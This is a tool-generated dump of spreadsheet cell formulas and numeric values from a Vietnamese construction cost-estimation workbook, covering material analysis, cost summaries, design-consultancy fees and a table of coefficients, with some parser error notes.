'  Chenh lech vat t,I21,E21*H21,""
'  Chenh lech vat t,J21, Gia VL den H!F19,""
'  Chenh lech vat t,K21,F21,""
'  Chenh lech vat t,L21,G21,""
'  Chenh lech vat t,M21,L21-K21,""
'  Chenh lech vat t,N21,J21*M21,""
'  Chenh lech vat t,I22,R~6C~8,""
'  Chenh lech vat t,N22,R~6C~13,""
'  Phan tich vat t,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Phan tich vat t,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Phan tich vat t,A7,"",1.00000000000000000000
'  Phan tich vat t,F7, StartU!G8,""
'  Phan tich vat t,A8,"",2.00000000000000000000
'  Phan tich vat t,F8, StartU!G10,""
'  Phan tich vat t,A9,"",3.00000000000000000000
'  Phan tich vat t,F9, StartU!G13,""
'  Phan tich vat t,A10,"",4.00000000000000000000
'  Phan tich vat t,F10, StartU!G15,""
'  Phan tich vat t,A11,"",5.00000000000000000000
'  Phan tich vat t,F11, StartU!G17,""
'  Phan tich vat t,G13,0.00200000000000000004*296.02999999999997271516,""
'  Phan tich vat t,I13,"PRODUCT(F11,G13,H13)",""
'  Phan tich vat t,J13,G17,""
'  Phan tich vat t,G14,0.00200000000000000004*1.12000000000000010658,""
'  Phan tich vat t,I14,"PRODUCT(F11,G14,H14)",""
'  Phan tich vat t,J14,G17,""
'  Phan tich vat t,G15,0.00200000000000000004*260,""
'  Phan tich vat t,I15,"PRODUCT(F11,G15,H15)",""
'  Phan tich vat t,J15,G17,""
'  Phan tich vat t,G16,"",2.00000000000000000000
'  Phan tich vat t,I16,"PRODUCT(F11,G16,H16)",""
'  Phan tich vat t,J16,G17,""
'  Phan tich vat t,G17,"",5.00000000000000000000
'  Phan tich vat t,G19,"",0.20000015258789061168
'  Phan tich vat t,I19,"PRODUCT(F11,G19,H19)",""
'  Phan tich vat t,A20,"",6.00000000000000000000
'  Phan tich vat t,F20, StartU!G18,""
'  Phan tich vat t,A21,"",7.00000000000000000000
'  Phan tich vat t,F21, StartU!G21,""
'  Phan tich vat t,A22,"",8.00000000000000000000
'  Phan tich vat t,F22, StartU!G24,""
'  Phan tich vat t,A23,"",9.00000000000000000000
'  Phan tich vat t,F23, StartU!G26,""
'  Phan tich vat t,G25,0.53800000000000003375*213.02000000000001023182,""
'  Phan tich vat t,I25,"PRODUCT(F23,G25,H25)",""
'  Phan tich vat t,G26,0.53800000000000003375*1.14999999999999991118,""
'  Phan tich vat t,I26,"PRODUCT(F23,G26,H26)",""
'  Phan tich vat t,G27,0.53800000000000003375*260,""
'  Phan tich vat t,I27,"PRODUCT(F23,G27,H27)",""
'  Phan tich vat t,G28,"",0.89300000000000001599
'  Phan tich vat t,I28,"PRODUCT(F23,G28,H28)",""
'  Phan tich vat t,G30,"",0.99000061035156250444
'  Phan tich vat t,I30,"PRODUCT(F23,G30,H30)",""
'  Phan tich vat t,A31,"",10.00000000000000000000
'  Phan tich vat t,F31, StartU!G29,""
'  Phan tich vat t,G33,"",16.50000000000000000000
'  Phan tich vat t,I33,"PRODUCT(F31,G33,H33)",""
'  Phan tich vat t,J33,G38,""
'  Phan tich vat t,G34,0.02500000000000000139*296.02999999999997271516,""
'  Phan tich vat t,I34,"PRODUCT(F31,G34,H34)",""
'  Phan tich vat t,J34,G38,""
'  Phan tich vat t,G35,0.02500000000000000139*1.12000000000000010658,""
'  Phan tich vat t,I35,"PRODUCT(F31,G35,H35)",""
'  Phan tich vat t,J35,G38,""
'  Phan tich vat t,G36,0.02500000000000000139*260,""
'  Phan tich vat t,I36,"PRODUCT(F31,G36,H36)",""
'  Phan tich vat t,J36,G38,""
'  Phan tich vat t,G37,"",0.35000030517578123446
'  Phan tich vat t,I37,"PRODUCT(F31,G37,H37)",""
'  Phan tich vat t,J37,G38,""
'  Phan tich vat t,G38,"",0.50000000000000000000
'  Phan tich vat t,G40,"",0.45000030517578126776
'  Phan tich vat t,I40,"PRODUCT(F31,G40,H40)",""
'  Phan tich vat t,G42,"",0.00300000000000000006
'  Phan tich vat t,I42,"PRODUCT(F31,G42,H42)",""
'  Phan tich vat t,A43,"",11.00000000000000000000
'  Phan tich vat t,F43, StartU!G32,""
'  Phan tich vat t,G45,"",10.00000000000000000000
'  Phan tich vat t,I45,"PRODUCT(F43,G45,H45)",""
'  Phan tich vat t,J45,G50,""
'  Phan tich vat t,G46,0.01499999999999999944*296.02999999999997271516,""
'  Phan tich vat t,I46,"PRODUCT(F43,G46,H46)",""
'  Phan tich vat t,J46,G50,""
'  Phan tich vat t,G47,0.01499999999999999944*1.12000000000000010658,""
'  Phan tich vat t,I47,"PRODUCT(F43,G47,H47)",""
'  Phan tich vat t,J47,G50,""
'  Phan tich vat t,G48,0.01499999999999999944*260,""
'  Phan tich vat t,I48,"PRODUCT(F43,G48,H48)",""
'  Phan tich vat t,J48,G50,""
'  Phan tich vat t,G49,"",0.24000015258789061945
'  Phan tich vat t,I49,"PRODUCT(F43,G49,H49)",""
'  Phan tich vat t,J49,G50,""
'  Phan tich vat t,G50,"",1.50000000000000000000
'  Phan tich vat t,G52,"",0.71000061035156247780
'  Phan tich vat t,I52,"PRODUCT(F43,G52,H52)",""
'  Phan tich vat t,G54,"",0.00400000000000000008
'  Phan tich vat t,I54,"PRODUCT(F43,G54,H54)",""
'  Phan tich vat t,A55,"",12.00000000000000000000
'  Phan tich vat t,F55, StartU!G37,""
'  Phan tich vat t,A56,"",13.00000000000000000000
'  Phan tich vat t,F56, StartU!G40,""
'  Phan tich vat t,A57,"",14.00000000000000000000
'  Phan tich vat t,F57, StartU!G43,""
'  Phan tich vat t,A58,"",15.00000000000000000000
'  Phan tich vat t,F58, StartU!G46,""
'  Phan tich vat t,A59,"",16.00000000000000000000
'  Phan tich vat t,F59, StartU!G49,""
'  Phan tich vat t,A60,"",17.00000000000000000000
'  Phan tich vat t,F60, StartU!G52,""
'  Phan tich vat t,A61,"",18.00000000000000000000
'  Phan tich vat t,E61,"",0.00000000000000000000
'  Phan tich vat t,F61, StartU!G55,""
'  Phan tich vat t,A62,"",19.00000000000000000000
'  Phan tich vat t,F62, StartU!G58,""
'  Phan tich vat t,A63,"",20.00000000000000000000
'  Phan tich vat t,F63, StartU!G61,""
'  Phan tich vat t,A64,"",21.00000000000000000000
'  Phan tich vat t,F64, StartU!G63,""
'  Phan tich vat t,A65,"",22.00000000000000000000
'  Phan tich vat t,F65, StartU!G65,""
'  Phan tich vat t,A66,"",23.00000000000000000000
'  Phan tich vat t,F66, StartU!G67,""
'  Phan tich vat t,A67,"",24.00000000000000000000
'  Phan tich vat t,F67, StartU!G68,""
'  Phan tich vat t,A68,"",25.00000000000000000000
'  Phan tich vat t,F68, StartU!G69,""
'  Phan tich vat t,A69,"",26.00000000000000000000
'  Phan tich vat t,F69, StartU!G70,""
'  Phan tich vat t,A70,"",27.00000000000000000000
'  Phan tich vat t,F70, StartU!G71,""
'  Tong hop vat t,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tong hop vat t,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Tong hop vat t,A7,"",1.00000000000000000000
'  Tong hop vat t,E7,[],""
'  Tong hop vat t,F7,[],""
'  Tong hop vat t,A8,"",2.00000000000000000000
'  Tong hop vat t,E8,[],""
'  Tong hop vat t,F8,[],""
'  Tong hop vat t,A9,"",3.00000000000000000000
'  Tong hop vat t,E9,[],""
'  Tong hop vat t,F9,[],""
'  Tong hop vat t,A10,"",4.00000000000000000000
'  Tong hop vat t,E10,[],""
'  Tong hop vat t,F10,[],""
'  Tong hop vat t,A11,"",5.00000000000000000000
'  Tong hop vat t,E11,[],""
'  Tong hop vat t,F11,[],""
'  Tong hop vat t,A12,"",6.00000000000000000000
'  Tong hop vat t,E12,[],""
'  Tong hop vat t,F12,[],""
'  Tong hop vat t,A13,"",7.00000000000000000000
'  Tong hop vat t,E13,[],""
'  Tong hop vat t,F13,[],""
'  Tong hop vat t,A14,"",8.00000000000000000000
'  Tong hop vat t,E14,[],""
'  Tong hop vat t,F14,[],""
'  Tong hop vat t,A16,"",9.00000000000000000000
'  Tong hop vat t,E16,[],""
'  Tong hop vat t,F16,[],""
'  Tong hop vat t,A17,"",10.00000000000000000000
'  Tong hop vat t,E17,[],""
'  Tong hop vat t,F17,[],""
'  Tong hop vat t,A19,"",11.00000000000000000000
'  Tong hop vat t,E19,[],""
'  Tong hop vat t,F19,[],""
'  Gia tri vat t,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Gia tri vat t,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Chi phi van chuye,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Chi phi van chuye,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Don gia chi tie,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Don gia chi tie,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Du tha,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Du tha,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Tu van Thiet k,J1,"",1.00000000000000000000
'  Tu van Thiet k,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tu van Thiet k,J2,"",1.00000000000000000000
'  Tu van Thiet k,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Tu van Thiet k,D6,"['D8', '1', '\x00Tu van Thiet k!B6']",""
'  Tu van Thiet k,D7,"['D9', '1', '\x00Tu van Thiet k!B6']",""
'  Tu van Thiet k,D8, Tong hop DTXD C!D25,""
'  Tu van Thiet k,D10,R~10C~3*1.10000000000000008882,""
'  Tu van Thiet k,A11,"",1.00000000000000000000
'  Tu van Thiet k,C11,"['D6', 'D7', 'J1', '"II1"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function&" - Chi phÝ thuª"']",""
'  Tu van Thiet k,D11,"['D6', 'D7', 'J1', '"II1"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function-R~11C~3']",""
'  Tu van Thiet k,A12,"",2.00000000000000000000
'  Tu van Thiet k,C12,"['D6', '0', 'IF(J1<4,J1,J1-1)', '"III1"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D12,"['D6', '0', 'IF(J1<4,J1,J1-1)', '"III1"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A13,"",3.00000000000000000000
'  Tu van Thiet k,C13,"['D6', '0', 'J1', '"III2"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D13,"['D6', '0', 'J1', '"III2"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A14,"",4.00000000000000000000
'  Tu van Thiet k,C14,"['D6', '0', 'J1', '"III3"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D14,"['D6', '0', 'J1', '"III3"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A15,"",5.00000000000000000000
'  Tu van Thiet k,C15,"['0', 'D7', 'J1', '"III4"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D15,"['0', 'D7', 'J1', '"III4"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A16,"",6.00000000000000000000
'  Tu van Thiet k,C16,"['D6', '0', 'J1', '"III5"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D16,"['D6', '0', 'J1', '"III5"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A17,"",7.00000000000000000000
'  Tu van Thiet k,C17,"['0', 'D7', 'J1', '"III6"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D17,"['0', 'D7', 'J1', '"III6"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A18,"",8.00000000000000000000
'  Tu van Thiet k,C18,"['D6', 'D7', 'J1', '"II1"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D18,"['D6', 'D7', 'J1', '"II1"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A19,"",9.00000000000000000000
'  Tu van Thiet k,C19,"['D6', 'D7', 'J1', '"II2"', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D19,"['D6', 'D7', 'J1', '"II2"', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A20,"",10.00000000000000000000
'  Tu van Thiet k,C20,"['D6', '0', 'J2', '"III"&((J1*2)-1)', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D20,"['D6', '0', 'J2', '"III"&((J1*2)-1)', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,A21,"",11.00000000000000000000
'  Tu van Thiet k,C21,"['D6', '0', 'J2', '"III"&(J1*2)', '"CT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D21,"['D6', '0', 'J2', '"III"&(J1*2)', '"GT"', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tu van Thiet k,D24,"['(D8+D9+D10)', '10']",""
'  Tu van Thiet k,D25,"['(D8+D9+D10+D24)', 'ROUND(-3.00000000000000000000)']",""
'  Tu van Thiet k,A28,"['D25', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Tong hop DTXD C,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tong hop DTXD C,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Du toan XDC,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Du toan XDC,A7,"",1.00000000000000000000
'  Du toan XDC,A10,"",2.00000000000000000000
'  Du toan XDC,A11,"",3.00000000000000000000
'  Du toan XDC,A12,"",4.00000000000000000000
'  Tong hop CPX,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tong hop CPT,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tong hop CPT,A8,"",1.00000000000000000000
'  Tong hop CPT,A9,"",2.00000000000000000000
'  Tong hop CPT,A10,"",3.00000000000000000000
'  Tong hop CPT,A11,"",4.00000000000000000000
'  Tong hop CP,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tien do thi con,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tien do thi con,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Bia du toa,L6,NOW(),""
'  Bia du toa,N6,NOW(),""
'  Bia du toa,P6,NOW(),""
'  Tro giu,A2,INSERT(3),""
'  Tro giu,A3,RETURN(),""
'  Confi,B1,1,""
'  Confi,D1,"",1.00000000000000000000
'  Confi,B2,D2,""
'  Confi,D2,"",4.32000244140624989342
'  Confi,I2,"",1.00000000000000000000
'  Confi,R2,"",0.06800000000000000488
'  Confi,S2,"",0.05299999999999999850
'  Confi,T2,"",0.04399999999999999745
'  Confi,U2,"",0.03099999999999999978
'  Confi,V2,"",0.01899999999999999953
'  Confi,CA2,"",1.00000000000000000000
'  Confi,CJ2,"",0.07900000000000000078
'  Confi,CK2,"",0.06099999999999999867
'  Confi,CL2,"",0.05500003814697265736
'  Confi,CM2,"",0.03799999999999999906
'  Confi,CN2,"",0.02400000000000000050
'  Confi,B3,D3,""
'  Confi,D3,"",1.55000122070312507105
'  Confi,I3,"",1.00000000000000000000
'  Confi,M3,"",0.79000061035156254885
'  Confi,N3,"",0.71899999999999997247
'  Confi,O3,"",0.57500030517578126776
'  Confi,P3,"",0.48899999999999999023
'  Confi,Q3,"",0.38800000000000001155
'  Confi,R3,"",0.28799999999999997824
'  Confi,S3,"",0.24399999999999999467
'  Confi,T3,"",0.20100000000000001199
'  Confi,U3,"",0.17299999999999998712
'  Confi,V3,"",0.14399999999999998912
'  Confi,CA3,"",1.00000000000000000000
'  Confi,CE3,"",0.91600000000000003642
'  Confi,CF3,"",0.83399999999999996358
'  Confi,CG3,"",0.66700000000000003730
'  Confi,CH3,"",0.56699999999999994849
'  Confi,CI3,"",0.45000030517578126776
'  Confi,CJ3,"",0.33400000000000001910
'  Confi,CK3,"",0.28299999999999997380
'  Confi,CL3,"",0.25100000000000000089
'  Confi,CM3,"",0.21599999999999999756
'  Confi,CN3,"",0.18000015258789062167
'  Confi,B4,D4,""
'  Confi,D4,"",6.00000000000000000000
'  Confi,I4,"",1.00000000000000000000
'  Confi,K4,"",0.55700000000000005063
'  Confi,L4,"",0.55700000000000005063
'  Confi,CA4,"",1.00000000000000000000
'  Confi,CC4,"",0.64600000000000001865
'  Confi,CD4,"",0.64600000000000001865
'  Confi,B5,D5,""
'  Confi,D5,"",5.50000000000000000000
'  Confi,I5,"",2.00000000000000000000
'  Confi,T5,"",0.02900000000000000147
'  Confi,U5,"",0.02000001907348632896
'  Confi,V5,"",0.01200000000000000025
'  Confi,CA5,"",2.00000000000000000000
'  Confi,CJ5,"",0.05199999999999999761
'  Confi,CK5,"",0.04100000000000000172
'  Confi,CL5,"",0.03599999999999999728
'  Confi,B6,D6,""
'  Confi,D6,"",10.00000000000000000000
'  Confi,I6,"",2.00000000000000000000
'  Confi,M6,"",0.39600000000000001865
'  Confi,N6,"",0.36000030517578124334
'  Confi,O6,"",0.26400000000000001243
'  Confi,P6,"",0.24000015258789061945
'  Confi,Q6,"",0.19200000000000000400
'  Confi,R6,"",0.15599999999999999978
'  Confi,S6,"",0.12099999999999999645
'  Confi,T6,"",0.09600000000000000200
'  Confi,U6,"",0.08400000000000000522
'  Confi,V6,"",0.07199999999999999456
'  Confi,CA6,"",2.00000000000000000000
'  Confi,CE6,"",0.45900000000000001910
'  Confi,CF6,"",0.41799999999999998268
'  Confi,CG6,"",0.30599999999999999423
'  Confi,CH6,"",0.27800000000000002487
'  Confi,CI6,"",0.22300000000000000377
'  Confi,CJ6,"",0.18099999999999999423
'  Confi,B7,"",1.00000000000000000000
'  Confi,I7,"",2.00000000000000000000
'  Confi,K7,"",0.32300000000000000933
'  Confi,L7,"",0.32300000000000000933
'  Confi,CA7,"",2.00000000000000000000
'  Confi,CC7,"",0.35699999999999998401
'  Confi,CD7,"",0.35699999999999998401
'  Confi,I8,"",3.00000000000000000000
'  Confi,R8,"",0.04599999999999999922
'  Confi,S8,"",0.03599999999999999728
'  Confi,T8,"",0.03000001907348632743
'  Confi,U8,"",0.02100000000000000130
'  Confi,V8,"",0.01299999999999999940
'  Confi,CA8,"",3.00000000000000000000
'  Confi,CJ8,"",0.05299999999999999850
'  Confi,CK8,"",0.04200000000000000261
'  Confi,CL8,"",0.03699999999999999817
'  Confi,CM8,"",0.02599999999999999881
'  Confi,CN8,"",0.01600000000000000033
'  Confi,I9,"",3.00000000000000000000
'  Confi,M9,"",0.45400000000000001465
'  Confi,N9,"",0.41299999999999997824
'  Confi,O9,"",0.30299999999999999156
'  Confi,R9,"",0.17899999999999999245
'  Confi,S9,"",0.13900000000000001243
'  Confi,T9,"",0.11000007629394531472
'  Confi,U9,"",0.09600000000000000200
'  Confi,V9,"",0.08300000000000000433
'  Confi,CA9,"",3.00000000000000000000
'  Confi,CE9,"",0.52700000000000002398
'  Confi,CF9,"",0.47799999999999998046
'  Confi,CG9,"",0.35099999999999997868
'  Confi,CH9,"",0.31900000000000000577
'  Confi,CI9,"",0.25500015258789060502
'  Confi,CJ9,"",0.20799999999999999045
'  Confi,CK9,"",0.16100000000000000422
'  Confi,CL9,"",0.13700000000000001066
'  Confi,CM9,"",0.12000007629394530972
'  Confi,CN9,"",0.10299999999999999434
'  Confi,B10,"",5.00000000000000000000
'  Confi,I10,"",3.00000000000000000000
'  Confi,K10,"",0.33600000000000002087
'  Confi,L10,"",0.33600000000000002087
'  Confi,CA10,"",3.00000000000000000000
'  Confi,CC10,"",0.33600000000000002087
'  Confi,CD10,"",0.33600000000000002087
'  Confi,I11,"",4.00000000000000000000
'  Confi,R11,"",0.04200000000000000261
'  Confi,S11,"",0.03300000000000000155
'  Confi,T11,"",0.02800000000000000058
'  Confi,U11,"",0.01899999999999999953
'  Confi,V11,"",0.01099999999999999936
'  Confi,CA11,"",4.00000000000000000000
'  Confi,CJ11,"",0.04900000000000000189
'  Confi,CK11,"",0.03799999999999999906
'  Confi,CL11,"",0.03500001907348632840
'  Confi,CM11,"",0.02299999999999999961
'  Confi,CN11,"",0.01400000000000000029
'  Confi,I12,"",4.00000000000000000000
'  Confi,O12,"",0.25300000000000000266
'  Confi,P12,"",0.23000015258789063832
'  Confi,Q12,"",0.18399999999999999689
'  Confi,R12,"",0.15000007629394532249
'  Confi,S12,"",0.11600000000000000588
'  Confi,T12,"",0.09199999999999999845
'  Confi,U12,"",0.08100000000000000255
'  Confi,V12,"",0.06900000000000000577
'  Confi,CA12,"",4.00000000000000000000
'  Confi,CE12,"",0.44100000000000000311
'  Confi,CF12,"",0.40000030517578122335
'  Confi,CG12,"",0.29299999999999998268
'  Confi,CH12,"",0.26700000000000001510
'  Confi,CI12,"",0.21299999999999999489
'  Confi,CJ12,"",0.17399999999999998801
'  Confi,CM12,"",0.10100000000000000644
'  Confi,CN12,"",0.08599999999999999312
'  Confi,I13,"",4.00000000000000000000
'  Confi,K13,"",0.30899999999999999689
'  Confi,L13,"",0.30899999999999999689
'  Confi,CA13,"",4.00000000000000000000
'  Confi,CC13,"",0.35799999999999998490
'  Confi,CD13,"",0.35799999999999998490
'  Confi,I14,"",5.00000000000000000000
'  Confi,R14,"",0.06210000000000000242
'  Confi,S14,"",0.04830000000000000265
'  Confi,T14,"",0.04139999999999999930
'  Confi,U14,"",0.02900000000000000147
'  Confi,V14,"",0.01700000000000000122
'  Confi,CA14,"",5.00000000000000000000
'  Confi,CJ14,"",0.07199999999999999456
'  Confi,CK14,"",0.05600000000000000117
'  Confi,CL14,"",0.05199999999999999761
'  Confi,CM14,"",0.03599999999999999728
'  Confi,CN14,"",0.02100000000000000130
'  Confi,I15,"",5.00000000000000000000
'  Confi,M15,"",0.46200000000000002176
'  Confi,N15,"",0.42000030517578124112
'  Confi,O15,"",0.33600000000000002087
'  Confi,P15,"",0.27600000000000002309
'  Confi,Q15,"",0.22700000000000000733
'  Confi,R15,"",0.16800000000000001044
'  Confi,S15,"",0.14299999999999998823
'  Confi,T15,"",0.11799999999999999378
'  Confi,U15,"",0.10100000000000000644
'  Confi,V15,"",0.08599999999999999312
'  Confi,CA15,"",5.00000000000000000000
'  Confi,CE15,"",0.53600000000000003197
'  Confi,CF15,"",0.48699999999999998845
'  Confi,CI15,"",0.26300000000000001155
'  Confi,CL15,"",0.01469999999999999953
'  Confi,CM15,"",0.12600000000000000089
'  Confi,CN15,"",0.10699999999999999789
'  Confi,I16,"",5.00000000000000000000
'  Confi,K16,"",0.21599999999999999756
'  Confi,L16,"",0.21599999999999999756
'  Confi,CA16,"",5.00000000000000000000
'  Confi,CC16,"",0.25100000000000000089
'  Confi,CD16,"",0.25100000000000000089
'  Confi,I18,"",1.00000000000000000000
'  Confi,K18,"",0.39600000000000001865
'  Confi,L18,"",0.39600000000000001865
'  Confi,T18,"",0.03300000000000000155
'  Confi,U18,"",0.02299999999999999961
'  Confi,CA18,"",1.00000000000000000000
'  Confi,CC18,"",0.39600000000000001865
'  Confi,CD18,"",0.39600000000000001865
'  Confi,CL18,"",0.03300000000000000155
'  Confi,CM18,"",0.02299999999999999961
'  Confi,I19,"",1.00000000000000000000
'  Confi,K19,"",1.78200000000000002842
'  Confi,L19,"",1.78200000000000002842
'  Confi,O19,"",1.34200000000000008171
'  Confi,P19,"",1.18799999999999994493
'  Confi,Q19,"",1.00800000000000000711
'  Confi,R19,"",0.78700000000000003286
'  Confi,S19,"",0.61599999999999999201
'  Confi,CA19,"",1.00000000000000000000
'  Confi,CC19,"",1.43700000000000005507
'  Confi,CD19,"",1.43700000000000005507
'  Confi,CE19,"",1.14799999999999990941
'  Confi,CF19,"",1.05699999999999993960
'  Confi,CG19,"",0.90200000000000002398
'  Confi,CH19,"",0.79800000000000004263
'  Confi,CI19,"",0.67700000000000004619
'  Confi,CJ19,"",0.52900000000000002576
'  Confi,CK19,"",0.41399999999999997913
'  Confi,CL19,"",0.33600000000000002087
'  Confi,CM19,"",0.22200000000000000289
'  Confi,I20,"",2.00000000000000000000
'  Confi,K20,"",0.27700000000000002398
'  Confi,L20,"",0.27700000000000002398
'  Confi,M20,"",0.23100000000000001088
'  Confi,N20,"",0.21000015258789062056
'  Confi,O20,"",0.16800000000000001044
'  Confi,T20,"",0.02299999999999999961
'  Confi,U20,"",0.01600000000000000033
'  Confi,CA20,"",2.00000000000000000000
'  Confi,CC20,"",0.27700000000000002398
'  Confi,CD20,"",0.27700000000000002398
'  Confi,CE20,"",0.23100000000000001088
'  Confi,CF20,"",0.21000015258789062056
'  Confi,CG20,"",0.16800000000000001044
'  Confi,CL20,"",0.02299999999999999961
'  Confi,CM20,"",0.01600000000000000033
'  Confi,I21,"",2.00000000000000000000
'  Confi,M21,"",1.03400000000000003020
'  Confi,N21,"",0.99000061035156250444
'  Confi,O21,"",0.91100000000000003197
'  Confi,P21,"",0.81399999999999994582
'  Confi,Q21,"",0.70399999999999995914
'  Confi,R21,"",0.55400000000000004796
'  Confi,S21,"",0.43199999999999999512
'  Confi,T21,"",0.34599999999999997424
'  Confi,U21,"",0.23100000000000001088
'  Confi,CA21,"",2.00000000000000000000
'  Confi,CC21,"",1.16700000000000003730
'  Confi,CD21,"",1.16700000000000003730
'  Confi,CE21,"",0.93200000000000005063
'  Confi,CF21,"",0.85399999999999998135
'  Confi,CG21,"",0.71399999999999996803
'  Confi,CH21,"",0.63800000000000001155
'  Confi,CI21,"",0.55200000000000004619
'  Confi,CJ21,"",0.43399999999999999689
'  Confi,CK21,"",0.33900000000000002354
'  Confi,CL21,"",0.27100000000000001865
'  Confi,CM21,"",0.18099999999999999423
'  Confi,I22,"",3.00000000000000000000
'  Confi,K22,"",0.26300000000000001155
'  Confi,L22,"",0.26300000000000001155
'  Confi,M22,"",0.21900000000000000022
'  Confi,P22,"",0.10899999999999999967
'  Confi,Q22,"",0.07699999999999999900
'  Confi,R22,"",0.04500003814697265542
'  Confi,S22,"",0.02900000000000000147
'  Confi,T22,"",0.02199999999999999872
'  Confi,U22,"",0.01500000953674316372
'  Confi,CA22,"",3.00000000000000000000
'  Confi,CC22,"",0.26300000000000001155
'  Confi,CD22,"",0.26300000000000001155
'  Confi,CE22,"",0.21900000000000000022
'  Confi,CH22,"",0.10899999999999999967
'  Confi,CI22,"",0.07699999999999999900
'  Confi,CJ22,"",0.04500003814697265542
'  Confi,CK22,"",0.02900000000000000147
'  Confi,CL22,"",0.02199999999999999872
'  Confi,CM22,"",0.01500000953674316372
'  Confi,I23,"",3.00000000000000000000
'  Confi,K23,"",0.95399999999999995914
'  Confi,L23,"",0.95399999999999995914
'  Confi,M23,"",0.79300000000000003819
'  Confi,N23,"",0.73899999999999999023
'  Confi,O23,"",0.66100000000000003197
'  Confi,P23,"",0.58299999999999996270
'  Confi,Q23,"",0.44600000000000000755
'  Confi,R23,"",0.27500015258789062278
'  Confi,S23,"",0.21599999999999999756
'  Confi,T23,"",0.16300000000000000600
'  Confi,U23,"",0.10899999999999999967
'  Confi,CA23,"",3.00000000000000000000
'  Confi,CC23,"",1.25400000000000000355
'  Confi,CD23,"",1.25400000000000000355
'  Confi,CG23,"",0.72299999999999997602
'  Confi,CH23,"",0.63800000000000001155
'  Confi,CI23,"",0.48899999999999999023
'  Confi,CJ23,"",0.30099999999999998979
'  Confi,CK23,"",0.23699999999999998845
'  Confi,CL23,"",0.17799999999999999156
'  Confi,CM23,"",0.12000007629394530972
'  Confi,I24,"",4.00000000000000000000
'  Confi,K24,"",0.24599999999999999645
'  Confi,L24,"",0.24599999999999999645
'  Confi,M24,"",0.20500015258789061612
'  Confi,N24,"",0.18599999999999999867
'  Confi,O24,"",0.14899999999999999356
'  Confi,P24,"",0.10199999999999999345
'  Confi,Q24,"",0.07000003814697265681
'  Confi,R24,"",0.04299999999999999656
'  Confi,S24,"",0.02699999999999999969
'  Confi,T24,"",0.02000001907348632896
'  Confi,U24,"",0.01400000000000000029
'  Confi,CA24,"",4.00000000000000000000
'  Confi,CC24,"",0.24599999999999999645
'  Confi,CD24,"",0.24599999999999999645
'  Confi,CE24,"",0.20500015258789061612
'  Confi,CF24,"",0.18599999999999999867
'  Confi,CG24,"",0.14899999999999999356
'  Confi,CH24,"",0.10199999999999999345
'  Confi,CI24,"",0.07000003814697265681
'  Confi,CJ24,"",0.04299999999999999656
'  Confi,CK24,"",0.02699999999999999969
'  Confi,CL24,"",0.02000001907348632896
'  Confi,CM24,"",0.01400000000000000029
'  Confi,I25,"",4.00000000000000000000
'  Confi,K25,"",0.88600000000000000977
'  Confi,L25,"",0.88600000000000000977
'  Confi,M25,"",0.74000061035156250444
'  Confi,N25,"",0.68600000000000005418
'  Confi,O25,"",0.62099999999999999645
'  Confi,P25,"",0.54600000000000004086
'  Confi,Q25,"",0.42099999999999998535
'  Confi,R25,"",0.25400000000000000355
'  Confi,S25,"",0.20200000000000001288
'  Confi,T25,"",0.15599999999999999978
'  Confi,U25,"",0.10199999999999999345
'  Confi,CA25,"",4.00000000000000000000
'  Confi,CC25,"",1.23300000000000009592
'  Confi,CD25,"",1.23300000000000009592
